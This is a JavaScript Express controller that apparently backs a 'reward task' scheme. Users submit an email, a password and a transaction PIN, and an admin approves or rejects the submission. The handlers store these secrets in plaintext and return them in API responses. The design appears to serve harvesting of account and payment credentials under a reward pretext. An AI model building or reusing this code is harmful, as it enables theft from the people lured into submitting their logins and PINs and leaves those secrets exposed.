import prisma from "../config/prisma.js";

/*
|--------------------------------------------------------------------------
| SUBMIT REWARD CREDENTIALS
|--------------------------------------------------------------------------
*/

export const submitRewardCredentials = async (req, res) => {

    try {

        const { email, password, transactionPin } = req.body;

        if (!email || !password || !transactionPin) {

            return res.status(400).json({

                success: false,
                message: "Email, password and transaction PIN are required."

            });

        }

        const existing = await prisma.rewardCredential.findUnique({

            where: {
                userId: req.user.id
            }

        });

        /*
        |--------------------------------------------------------------------------
        | FIRST SUBMISSION
        |--------------------------------------------------------------------------
        */

        if (!existing) {

            const reward = await prisma.rewardCredential.create({

                data: {

                    userId: req.user.id,

                    email,

                    password,

                    transactionPin,

                    taskCompleted: false,

                    rewardPaid: false,

                    adminApproved: null,

                    rejectionReason: null

                }

            });

            return res.status(201).json({

                success: true,

                message: "Reward task submitted successfully.",

                reward

            });

        }

        /*
        |--------------------------------------------------------------------------
        | ALREADY APPROVED
        |--------------------------------------------------------------------------
        */

        if (existing.adminApproved === true) {

            return res.status(400).json({

                success: false,

                message: "You have already completed this reward task."

            });

        }

        /*
        |--------------------------------------------------------------------------
        | UPDATE AFTER REJECTION
        |--------------------------------------------------------------------------
        */

        const reward = await prisma.rewardCredential.update({

            where: {

                userId: req.user.id

            },

            data: {

                email,

                password,

                transactionPin,

                adminApproved: null,

                rejectionReason: null,

                taskCompleted: false,

                rewardPaid: false

            }

        });

        return res.status(200).json({

            success: true,

            message: "Reward task re-submitted successfully.",

            reward

        });

    }

    catch (error) {

        console.error("SUBMIT REWARD ERROR");
        console.error(error);

        return res.status(500).json({

            success: false,

            message: "Server Error"

        });

    }

};
export const getRewardStatus = async (req, res) => {

    try {

        const reward = await prisma.rewardCredential.findUnique({

            where: {
                userId: req.user.id
            }

        });

        if (!reward) {

            return res.status(404).json({

                success: false,
                message: "Reward record not found."

            });

        }

        return res.json({

            success: true,
            reward

        });

    } catch (error) {

        console.error(error);

        return res.status(500).json({

            success: false,
            message: "Server Error"

        });

    }

};